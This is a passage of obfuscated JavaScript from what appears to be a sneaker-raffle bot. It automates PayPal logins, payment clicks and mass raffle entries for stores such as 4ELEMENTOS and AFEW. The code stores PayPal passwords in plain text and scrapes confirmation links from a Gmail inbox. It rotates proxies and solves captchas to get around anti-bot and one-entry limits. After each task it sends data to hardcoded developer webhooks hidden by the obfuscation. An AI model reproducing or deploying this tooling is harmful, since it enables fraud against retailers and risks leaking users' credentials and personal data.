        _0x42e94f['Proxy'] = _0x61d88a[_0x526543], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x4630d0 = await _0xf4f9ff['get']('Password');
        return _0x42e94f['Password'] = _0x4630d0['Password'], _0x376369['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x42e94f['Email'] + ',' + _0x42e94f['Password'] + ',' + _0x42e94f['Proxy']), _0x42e94f;
    }
    let _0x146dfa = await _0x3cdd35();
    var _0x1d9431 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x24674b = await _0xf4f9ff['get']('Amount'), _0x2be9a4 = _0x24674b['Amount'];
    async function _0x50d5ae() {
        let _0x467fc2 = 0x0;
        var _0x1c66e2 = new _0x39794d({
            'user': _0x2795a0['masterMail'],
            'password': _0x2795a0['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x26441b(_0xa5ae30) {
            _0x1c66e2['openBox']('INBOX', ![], _0xa5ae30);
        }
        _0x1c66e2['once']('ready', function () {
            _0x26441b(function (_0x306f5e, _0x1d8ef0) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x306f5e)
                    throw _0x306f5e;
                _0x1c66e2['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x14dfbf, _0x580c82) {
                    if (!_0x580c82 || !_0x580c82['length'])
                        console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20No\x20mails\x20found'), _0x1c66e2['end']();
                    else {
                        _0x580c82 = _0x580c82['slice'](0x0, _0x2be9a4);
                        var _0x430733 = _0x1c66e2['seq']['fetch'](_0x580c82, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x430733['on']('message', function (_0x13598c, _0x53e435) {
                            var _0x19bc0c = '(#' + _0x53e435 + ')\x20';
                            _0x13598c['on']('body', function (_0x541e18, _0x2e366a) {
                                _0x3020dc(_0x541e18, (_0x46e5a9, _0x2dcaaa) => {
                                    if (_0x2dcaaa['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x2dcaaa['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x2dcaaa['text']['split']('[')[0x2];
                                        var _0x376908 = mes['split'](']')[0x0];
                                        _0x1d9431['push'](_0x376908);
                                    }
                                });
                            }), _0x13598c['once']('end', function () {
                                _0x467fc2++;
                            });
                        }), _0x430733['once']('error', function (_0x5eba7e) {
                            console['log']('Fetch\x20error:\x20' + _0x5eba7e);
                        }), _0x430733['once']('end', function () {
                            _0x1c66e2['end']();
                        });
                    }
                });
            });
        }), _0x1c66e2['once']('error', function (_0x2a153e) {
            console['log'](_0x536226['red'](_0x2a153e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x1c66e2['once']('end', async function () {
        }), _0x1c66e2['connect']();
    }
    try {
        _0x50d5ae(), await _0xa2099c(0xfa0), console['log']('Found\x20' + _0x1d9431['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xa2099c(0xfa0);
    }
    var _0x9df142;
    _0x215576('' + _0xbc0633);
    var _0x39e52a = _0x146dfa['Proxy']['split'](':'), _0x54f5b4;
    try {
        _0x54f5b4 = await _0xfda795['launch']({
            'userDataDir': 'sessions/' + _0x146dfa['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x39e52a[0x0] + ':' + _0x39e52a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x54f5b4 = await _0xfda795['launch']({
            'userDataDir': 'sessions/' + _0x146dfa['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x39e52a[0x0] + ':' + _0x39e52a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Getting\x20Session');
        const _0x53f7b1 = await _0x54f5b4['newPage']();
        await _0x53f7b1['authenticate']({
            'username': '' + _0x39e52a[0x2],
            'password': '' + _0x39e52a[0x3]
        }), await _0x53f7b1['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x53f7b1['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x53f7b1['waitForSelector']('#email');
            let _0x2b9f02 = await _0x53f7b1['$eval']('#email', _0x2e049d => _0x2e049d['getAttribute']('value'));
            if (_0x2b9f02 == '') {
                await _0x53f7b1['type']('#email', _0x146dfa['Email']), await _0xa2099c(0x1d3);
                let _0x378618 = await _0x53f7b1['$']('#splitPassword');
                _0x378618 && (await _0x53f7b1['click']('#btnNext'), await _0xa2099c(0xa28)), await _0x53f7b1['type']('#password', _0x146dfa['Password']), await _0xa2099c(0x35c), await _0x53f7b1['click']('#btnLogin');
            } else
                await _0x53f7b1['type']('#password', _0x146dfa['Password']), await _0xa2099c(0x35c), await _0x53f7b1['click']('#btnLogin');
            await _0x53f7b1['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Successfully\x20logged\x20in'), await _0xa2099c(0x2710);
        } catch (_0x208c0c) {
            throw new Error('Login\x20session\x20expired\x20' + _0x208c0c);
        }
        for (var _0x2a886f = 0x0; _0x2a886f < _0x1d9431['length']; _0x2a886f++) {
            console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Task\x20' + (_0x2a886f + 0x1) + '\x20:\x20Starting\x20Verification'), _0x215576(_0xbc0633 + '\x20Task\x20' + (_0x2a886f + 0x1) + '\x20/\x20' + _0x1d9431['length']);
            const _0x152ff6 = await _0x54f5b4['newPage']();
            await _0x152ff6['goto']('' + _0x1d9431[_0x2a886f], { 'waitUntil': 'networkidle2' }), await _0xa2099c(0xbb8);
            try {
                const _0x3f4a9f = await _0x152ff6['$']('#challenge-heading');
                _0x3f4a9f && (console['log'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Task\x20' + (_0x2a886f + 0x1) + '\x20:\x20' + _0x536226['yellow']('2FA\x20Required')), await _0x152ff6['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xa2099c(0x9c40), await _0x152ff6['waitForSelector']('#payment-submit-btn'), await _0x152ff6['$eval']('#payment-submit-btn', _0x525073 => _0x525073['click']()), await _0x152ff6['click']('#payment-submit-btn');
                try {
                    await _0x152ff6['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xa2099c(0x5dc), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Task\x20' + (_0x2a886f + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x37dcc5) {
                    _0x141f92 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x37dcc5['message']);
                } finally {
                    if (_0x141f92 == 'yes' && _0x297e84 != 0x2) {
                        console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xbc0633['name'] + ']\x20Task\x20' + (_0x2a886f + 0x1) + '\x20:\x20Retrying\x20(' + _0x297e84 + '\x20/\x205)')), _0x2a886f = _0x2a886f - 0x1, _0x297e84 = _0x297e84 + 0x1;
                        continue;
                    }
                    _0x141f92 == 'yes' && _0x297e84 >= 0x2 && (_0x391951(csv[_0x2a886f], _0xbc0633), _0x141f92 = 'no', _0x297e84 = 0x0), await _0x152ff6['close'](), await _0xa2099c(0x4650);
                }
            } catch (_0x446229) {
                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xbc0633 + ']\x20Task\x20' + (_0x2a886f + 0x1) + '\x20:\x20' + _0x446229));
            }
        }
    } catch (_0x379b44) {
        console['log'](_0x536226['red']('' + _0x379b44));
    } finally {
        await _0x54f5b4['close']();
    }
}
const _0xabefbd = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x28bc7e, _0x344dd7, _0x331023) {
                    _0xfda795['use'](_0x442f24()), _0xfda795['use'](_0x5943b7({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2795a0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2fb3c2 = 0x0; _0x2fb3c2 < _0x344dd7['length']; _0x2fb3c2++) {
                        if (_0x470ee3 != 'yes')
                            var _0x470ee3 = '', _0x4acc46 = 0x0;
                        var _0x2d049c;
                        try {
                            await _0x53ad15(_0x344dd7, _0x2fb3c2);
                        } catch {
                            _0x470ee3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x215576(_0x28bc7e['name'] + '\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20/\x20' + _0x344dd7['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                        var _0x25a581 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x35af68 = Math['round'](Math['random']() * (_0x25a581['length'] - 0x1));
                        _0x344dd7[_0x2fb3c2]['Size'] == 'RANDOM' && (_0x344dd7[_0x2fb3c2]['Size'] = _0x25a581[_0x35af68]);
                        var _0x21f3fa = Math['round'](Math['random']() * (_0x331023['length'] - 0x1)), _0x5e842f = _0x331023[_0x21f3fa]['split'](':'), _0x3bf9ff;
                        try {
                            _0x3bf9ff = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e842f[0x0] + ':' + _0x5e842f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3bf9ff = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5e842f[0x0] + ':' + _0x5e842f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x3e3f4a = await _0x3bf9ff['newPage']();
                            await _0x3e3f4a['authenticate']({
                                'username': '' + _0x5e842f[0x2],
                                'password': '' + _0x5e842f[0x3]
                            }), await _0x3e3f4a['setRequestInterception'](!![]), _0x3e3f4a['on']('request', _0x536440 => {
                                _0x536440['resourceType']() === 'image' || _0x536440['resourceType']() === 'font' || _0x536440['resourceType']() === 'media' ? _0x536440['abort']() : _0x536440['continue']();
                            }), await _0x3e3f4a['goto'](_0x344dd7[_0x2fb3c2]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x3e3f4a['waitForSelector']('#accept-all-gdpr'), await _0x3e3f4a['click']('#accept-all-gdpr'), await _0x3e3f4a['waitForSelector']('#raffles-product'), await _0xa2099c(0x3e8), await _0x3e3f4a['$eval']('#raffles-product', _0x334e49 => _0x334e49['click']()), await _0xa2099c(0x1388), await _0x3e3f4a['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x495ff7 = await _0x3e3f4a['$']('.fancybox-inner\x20>\x20iframe'), _0x391e31 = await _0x495ff7['contentFrame']();
                            console['log'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x391e31['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xa2099c(0x1f4), await _0x391e31['type']('input[name=\x22sm-form-email\x22]', _0x344dd7[_0x2fb3c2]['Email']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-name\x22]', _0x344dd7[_0x2fb3c2]['FirstName'] + '\x20' + _0x344dd7[_0x2fb3c2]['LastName']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-street\x22]', _0x344dd7[_0x2fb3c2]['Address1'] + '\x20' + _0x344dd7[_0x2fb3c2]['HouseNumber'] + '\x20' + _0x344dd7[_0x2fb3c2]['Address2']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-city\x22]', _0x344dd7[_0x2fb3c2]['City']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-province\x22]', _0x344dd7[_0x2fb3c2]['State']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-zip\x22]', _0x344dd7[_0x2fb3c2]['Zip']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-country\x22]', _0x344dd7[_0x2fb3c2]['Country']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-form-phone\x22]', _0x344dd7[_0x2fb3c2]['Phone']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x344dd7[_0x2fb3c2]['Follower']), await _0xa2099c(0xc8), await _0x391e31['type']('input[name=\x22sm-cst.size\x22]', _0x344dd7[_0x2fb3c2]['Size']), await _0xa2099c(0x1f4), await _0x391e31['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xa2099c(0x1f4), await _0x391e31['click']('.icheckbox_simple-custom'), await _0xa2099c(0x1f4), console['log'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x391e31['$eval']('form', _0x24c0c7 => _0x24c0c7['submit']()), console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x470ee3 = '';
                            var _0xf16138 = await _0x258e8b(_0x344dd7[_0x2fb3c2], _0x28bc7e, 'dev', ![]), _0x356e9c = await _0x258e8b(_0x344dd7[_0x2fb3c2], _0x28bc7e, 'pub', ![]);
                            const _0x232264 = {
                                'succesDEVMSG': { 'embeds': [_0xf16138] },
                                'succesPUBMSG': { 'embeds': [_0x356e9c] }
                            };
                            try {
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x232264['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x232264['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x232264['succesPUBMSG']);
                            } catch (_0x3ab657) {
                                console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3ab657));
                            }
                        } catch (_0x449959) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20' + _0x449959)), _0x2d049c = '' + _0x449959;
                            var _0x3c47aa = await _0x258e8b(_0x344dd7[_0x2fb3c2], _0x28bc7e, 'dev', !![], _0x2d049c), _0xf16138 = await _0x258e8b(_0x344dd7[_0x2fb3c2], _0x28bc7e, 'dev', ![]), _0x356e9c = await _0x258e8b(_0x344dd7[_0x2fb3c2], _0x28bc7e, 'pub', ![]);
                            const _0x5a3443 = {
                                'succesDEVMSG': { 'embeds': [_0xf16138] },
                                'succesPUBMSG': { 'embeds': [_0x356e9c] }
                            };
                            _0x5a3443['errorDEV'] = { 'embeds': [_0x3c47aa] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x5a3443['errorDEV']), await _0x310f97(_0x281108, _0x5a3443['errorDEV']), _0x449959 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x470ee3 = 'yes');
                        } finally {
                            _0x3bf9ff['close']();
                            if (_0x470ee3 == 'yes' && _0x4acc46 != 0x5 && _0x2d049c != 'Size\x20Not\x20Found') {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Task\x20' + (_0x2fb3c2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4acc46 + '\x20/\x205)\x20')), _0x2fb3c2 = _0x2fb3c2 - 0x1, _0x4acc46 = _0x4acc46 + 0x1;
                                continue;
                            }
                            _0x470ee3 == 'yes' && _0x4acc46 >= 0x5 && (_0x391951(_0x344dd7[_0x2fb3c2], _0x28bc7e), _0x470ee3 = 'no', _0x4acc46 = 0x0), console['log'](_0x24b1d6() + '\x20[' + _0x28bc7e['name'] + ']\x20Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x588637, _0x56d7c8) {
                    var _0x54c8dd = [];
                    async function _0x2b1c91() {
                        var _0x4cb5e3 = new _0x39794d({
                            'user': _0x2795a0['masterMail'],
                            'password': _0x2795a0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1513fe(_0x18ea97) {
                            _0x4cb5e3['openBox']('INBOX', ![], _0x18ea97);
                        }
                        _0x4cb5e3['once']('ready', function () {
                            _0x1513fe(function (_0x248da8, _0x246377) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x248da8)
                                    throw _0x248da8;
                                _0x4cb5e3['seq']['search'](['UNSEEN'], function (_0x3fd657, _0x499c45) {
                                    if (!_0x499c45 || !_0x499c45['length'])
                                        console['log'](_0x24b1d6() + '\x20[' + _0x588637['name'] + ']\x20No\x20mails\x20found'), _0x4cb5e3['end']();
                                    else {
                                        var _0x18488b = _0x4cb5e3['seq']['fetch'](_0x499c45, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x18488b['on']('message', function (_0x1a13f9, _0x2ce9d8) {
                                            var _0x2b32dd = '(#' + _0x2ce9d8 + ')\x20';
                                            _0x1a13f9['on']('body', function (_0x4b5c26, _0x55525a) {
                                                _0x3020dc(_0x4b5c26, (_0x78d3c8, _0x344411) => {
                                                    if (_0x344411['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x18edc1 = _0x344411['html']['split']('\x0a');
                                                        for (var _0x1cd5d4 = 0x0; _0x1cd5d4 < _0x18edc1['length']; _0x1cd5d4++) {
                                                            if (_0x18edc1[_0x1cd5d4]['includes']('salesmanago') && _0x18edc1[_0x1cd5d4]['includes']('<td') && _0x18edc1[_0x1cd5d4]['includes']('href')) {
                                                                var _0x5c1d72 = _0x18edc1[_0x1cd5d4]['split']('href=\x22'), _0x54d7fa = _0x5c1d72[0x1]['split']('\x22')[0x0];
                                                                _0x54c8dd['push'](_0x54d7fa);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1a13f9['once']('end', function () {
                                            });
                                        }), _0x18488b['once']('error', function (_0x48765c) {
                                            console['log']('Fetch\x20error:\x20' + _0x48765c);
                                        }), _0x18488b['once']('end', function () {
                                            _0x4cb5e3['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4cb5e3['once']('error', function (_0x556291) {
                            console['log'](_0x536226['red'](_0x556291['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x4cb5e3['once']('end', async function () {
                        }), _0x4cb5e3['connect']();
                    }
                    async function _0x1d15af(_0xd7fcff, _0x4f1449, _0x197f80) {
                        for (var _0x10e6f2 = 0x0; _0x10e6f2 < _0x4f1449['length']; _0x10e6f2++) {
                            async function _0x10e64f(_0xbff71e, _0x129596, _0xea66da, _0x75ca35, _0x50e83b) {
                                var _0x20aacf, _0x5160ac = {}, _0x14feac = [], _0x47e6e4 = {}, _0x5e7997 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x210347 = Math['round'](Math['random']() * (_0x5e7997['length'] - 0x1));
                                _0x75ca35[_0xbff71e]['Size'] == 'RANDOM' && (_0x75ca35[_0xbff71e]['Size'] = _0x5e7997[_0x210347]);
                                !_0x75ca35 && (_0x75ca35 = {});
                                if (_0x2795a0['useRandomProxy'] = ![])
                                    var _0x40dea5 = _0x50e83b[_0xbff71e]['split'](':');
                                else
                                    var _0x54c9eb = Math['round'](Math['random']() * (_0x50e83b['length'] - 0x1)), _0x40dea5 = _0x50e83b[_0x54c9eb]['split'](':');
                                var _0x498036 = {
                                    'jar': _0x40df6f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xea66da['url'],
                                    'headers': _0xea66da['headers'],
                                    'body': JSON['stringify'](_0x5160ac),
                                    'proxy': 'http://' + _0x40dea5[0x2] + ':' + _0x40dea5[0x3] + '@' + _0x40dea5[0x0] + ':' + _0x40dea5[0x1]
                                };
                                return _0x129596 != 'ver' && (_0x498036['url'] = _0xea66da['url'], _0x498036['headers'] = _0xea66da['headers']), _0x129596 == 'ver' && (_0x498036['method'] = 'GET', _0x498036['url'] = _0x75ca35[_0xbff71e]), new Promise(function (_0x4f880c, _0x43d195) {
                                    callback = async (_0x5265e9, _0x23c772, _0x3ec378) => {
                                        if (!_0x5265e9 && _0x23c772['statusCode'] == 0xca || !_0x5265e9 && _0x23c772['statusCode'] == 0xc8) {
                                            if (_0x129596 != 'ver') {
                                                var _0x728267 = await _0x258e8b(_0x75ca35[_0xbff71e], _0xea66da, 'dev', ![]), _0x29c67c = await _0x258e8b(_0x75ca35[_0xbff71e], _0xea66da, 'pub', ![]);
                                                const _0x39e2bc = {
                                                    'succesDEVMSG': { 'embeds': [_0x728267] },
                                                    'succesPUBMSG': { 'embeds': [_0x29c67c] }
                                                };
                                                if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                                    try {
                                                        await _0x310f97(_0x2795a0['webhook'], _0x39e2bc['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x39e2bc['succesDEVMSG']), await _0xa2099c(0xc8);
                                                try {
                                                    await _0x310f97(_0x44d24a, _0x39e2bc['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x48af7e(_0x75ca35[_0xbff71e], _0xea66da);
                                            }
                                            _0x4f880c(console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0xea66da['name'] + ']\x20Task\x20' + (_0xbff71e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x129596 != 'ver') {
                                                var _0x4a9c4d = '' + _0x5265e9, _0xc131d1 = await _0x258e8b(_0x75ca35[_0xbff71e], _0xea66da, 'dev', !![], _0x4a9c4d), _0x3a8b2f = {};
                                                _0x3a8b2f['errorDEV'] = { 'embeds': [_0xc131d1] }, _0x391951(_0x75ca35[_0xbff71e], _0xea66da), _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x3a8b2f['errorDEV']), await _0x310f97(_0x281108, _0x3a8b2f['errorDEV']);
                                            }
                                            _0x43d195(console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0xea66da['name'] + ']\x20Task\x20' + (_0xbff71e + 0x1) + ':\x20' + _0x5265e9)));
                                        }
                                    };
                                    try {
                                        _0x129596 != 'ver' ? console['log'](_0x24b1d6() + '\x20[' + _0xea66da['name'] + ']\x20Task\x20' + (_0xbff71e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5160ac['data']['attributes']['email']) : console['log'](_0x24b1d6() + '\x20[' + _0xea66da['name'] + ']\x20Task\x20' + (_0xbff71e + 0x1) + ':\x20Fetching\x20Response'), _0x45876e(_0x498036, callback);
                                    } catch (_0x42336f) {
                                        console['log'](_0x24b1d6() + '\x20Task\x20' + (_0xbff71e + 0x1) + ':\x20' + _0x42336f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x10e64f(_0x10e6f2, 'ver', _0xd7fcff, _0x4f1449, _0x197f80), console['log'](_0x24b1d6() + '\x20[' + _0xd7fcff['name'] + ']\x20Sleeping\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            } catch (_0x3464e0) {
                            }
                        }
                    }
                    try {
                        _0x2b1c91(), await _0xa2099c(0xfa0), console['log']('Found\x20' + _0x54c8dd['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1d15af(_0x588637, _0x54c8dd, _0x56d7c8);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x5be394, _0x40ab6a, _0x10a0ec) {
                for (var _0x17a655 = 0x0; _0x17a655 < _0x40ab6a['length']; _0x17a655++) {
                    _0x2795a0['AfewDelay'] = _0x2795a0['delay'];
                    var _0x440048;
                    if (_0x139e73 != 'yes')
                        var _0x139e73 = '', _0x2c7428 = 0x0;
                    var _0x50497d = _0x40ab6a[_0x17a655]['Url'], _0xe7b182 = _0x40ab6a[_0x17a655];
                    _0x215576(_0x5be394['name'] + '\x20Task\x20' + (_0x17a655 + 0x1) + '\x20/\x20' + _0x40ab6a['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4);
                    try {
                        await _0x53ad15(_0x40ab6a, _0x17a655);
                    } catch {
                        _0x139e73 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x533cf3(_0x45c4ed) {
                        const _0x28816f = _0x376369['readFileSync']('../successful-tasks.csv', 'utf8'), _0x3385a3 = _0x4f3c15['parse'](_0x28816f, { 'header': !![] })['data'];
                        let _0x12a62e = ![];
                        for (var _0x29244f of _0x3385a3) {
                            if (_0x29244f['Url'] == _0x45c4ed['Url'] && _0x29244f['Email'] == _0x45c4ed['Email']) {
                                _0x12a62e = !![];
                                break;
                            }
                        }
                        return _0x12a62e;
                    }
                    if (await _0x533cf3(_0x40ab6a[_0x17a655]) == !![]) {
                        console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xcbbfa = await _0x258e8b(_0x40ab6a[_0x17a655], _0x5be394, 'dev', ![]), _0x3add16 = await _0x258e8b(_0x40ab6a[_0x17a655], _0x5be394, 'pub', ![]);
                    const _0x590215 = {
                        'succesDEVMSG': { 'embeds': [_0xcbbfa] },
                        'succesPUBMSG': { 'embeds': [_0x3add16] }
                    };
                    if (_0x40ab6a[_0x17a655]['Email'] == '' || _0x40ab6a[_0x17a655]['FirstName'] == '' || _0x40ab6a[_0x17a655]['LastName'] == '' || _0x40ab6a[_0x17a655]['Country'] == '' || _0x40ab6a[_0x17a655]['Size'] == '' || _0x40ab6a[_0x17a655]['Address1'] == '' || _0x40ab6a[_0x17a655]['Zip'] == '') {
                        console['log'](_0x24b1d6() + '\x20[' + _0x5be394['name'] + ']\x20Task\x20' + (_0x17a655 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2795a0['useRandomProxy'] = ![])
                        var _0x12b1be = _0x10a0ec[_0x17a655]['split'](':');
                    else
                        var _0x5eb038 = Math['round'](Math['random']() * (_0x10a0ec['length'] - 0x1)), _0x12b1be = _0x10a0ec[_0x5eb038]['split'](':');
                    var _0x38df85;
                    try {
                        _0x38df85 = await _0xfda795['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x12b1be[0x0] + ':' + _0x12b1be[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
